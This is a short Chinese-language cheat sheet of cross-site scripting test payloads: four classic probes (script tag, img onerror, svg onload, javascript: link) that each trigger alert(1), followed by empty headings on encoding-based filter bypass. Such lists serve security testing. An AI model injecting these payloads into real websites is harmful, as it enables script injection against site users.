## XSS测试语句
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href=javascript:alert(1)>
```

## xss绕过编码方式
### JS编码

